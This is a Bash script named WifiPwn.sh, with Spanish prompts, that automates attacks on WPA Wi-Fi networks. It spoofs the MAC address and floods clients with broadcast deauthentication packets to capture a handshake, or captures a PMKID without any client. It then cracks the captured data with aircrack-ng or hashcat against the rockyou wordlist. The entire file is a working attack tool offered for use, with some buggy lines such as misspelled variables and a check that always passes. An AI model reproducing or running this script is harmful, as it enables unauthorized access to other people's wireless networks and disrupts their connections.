#! /bin/bash

#Colours

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAS_FRONTED=noninteractive
trap ctrl_c INT


function ctrl_c(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour}Saliendo....${endColour}"
	tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
	rm Captura* myHashes 2>/dev/null
	exit 0 
	
}

function help_panel(){
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Uso: ./WifiPwn.sh${endColour}\n"
	echo -e "\t${purpleColour}a)${endColour}${yellowColour} Modo de ataque${endColour}"
	echo -e "\t\t${redColour}Handshake${endColour}"
	echo -e "\t\t${redColour}PKMID${endColour}"
	echo -e "\n\t${purpleColour}n)${endColour}${yellowColour} Nombre de la tarjeta de red${endColour}\n"
	echo -e "\n\ŧ ${purpleColour}h)${endColour}${yellowColour} Mostrar panel de ayuda${endColour}\n"
	exit 0
	
}

function dependencies(){
	tput civis
	clear; dependencies=(aircrack-ng macchanger)
	
	echo -e "${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios....${endColour}"
	sleep 2
	
	for program in "${dependencies[@]}"; do
		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Herramienta ${endColour}${purpleColour}$program${endColour}${blueColour}....${endColour}"
		
	test -f /usr/bin/$program
	
	if [ "$(echo $?)" -eq "0" ]; then
		echo -e "${greenColour} V${endColour}"
	else
		echo -e "${redColour} X${endColour}"
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Instalando programa ${endColour}${blueColour}$program${endColour}${yellowColor}....${endColour}"
		apt install $program -y > /dev/null 2>&1
	fi; sleep 1
	done
	
	tput cnorm
}

function Attack(){

	if [ "$(echo $attack_mode)" == "Handshake" ];then
		clear
		echo -e "${yelllowColour}[*]${endColour}${grayColour}Configurando tarjeta de red....${endColour}\n"
		airmon-ng start $networkCard > /dev/null 2>&1
		ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
		ifconfig ${networkCard}mon up ; killall dhclient wpa_supplicant 2>/dev/null
		
		echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva dirrecciòn MAC asignada ${endColour}${purpleColour}(${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i 'current' | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour})${endColour}"
		
		xterm -hold -e "airodump-ng ${networkCard}mon" &
		puid_xterm_process=$!
		
		echo -e "\n${yellowColour}[*]${endColour}${grayColour}Ingrese el ESSID del punto de acceso: ${endColour}" && read essid	
		echo -e "\n${yellowColour}[*]${endColour}${grayColour}Ingrese el canal del punto de acceso: ${endColour}" && read channel

		kill -9 $puid_xterm_process
		wait $puid_xterm_process 2>/dev/null
		
		xterm -hold -e "airodump-ng -c $channes -w Captura --essid $essid ${networkCard}mon" &
		airodump_filter_puid=$!
		
		sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $essid -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
		aireplay_puid=$!
		sleep 10; kill -9 $aireplay_puid; wait $aireplay_puid 2>/dev/null
		
		sleep 10; kill -9 $airodump_filter_puid; wait $airodump_filter_puid 2>/dev/null
		
		xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
		
		
	elif [ "$(echo $attack_mode)" == "PKMID" ]; then
		clear; echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando Clientless PKMID Attack....${endColour}\n"
		sleep 2
		
		timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura"
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes....${endColour}\n"
		sleep 2
		hcxcaptool -z myHashes Captura; rm Captura* 2>/dev/null
		
		test -f myHashes 
		
		if [ "$(echo $?)" ]; then	
			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando proceso de fuerza bruta....${endColour}\n"
			sleep 2
		
			hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
			rm myHashes 2> /dev/null
		else
			echo -e "\n${redColour}[!]${endColour}${grayColour} No se logrò obtener el paquete necesario${endColour}\n"
			sleep 2
			rm Captura* 2>/dev/null
		fi
	else 
		echo -e "\n${redColour}[!] Este modo de ataque es invalido${endColour}"	
			
fi
		
}

#MAIN FUNCTION

if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
	case $arg in 
	a) attack_mode=$OPTARG; let parameter_counter+=1;;
	n) networkCard=$OPTARG; let parameter_counter+=1;;
	h) help_panel;;
	esac
	done
	
	if [ $parameter_counter -ne 2 ]; then	
		help_panel
	else
		dependencies
		Attack
		tput cnorm; airmon-ng stop ${networkCarf}mon > /dev/null 2>&1
	fi
else 
	echo -e "\n${yellowColour}[!]${endColour}${redColour} No eres root${endColour}\n"
fi		
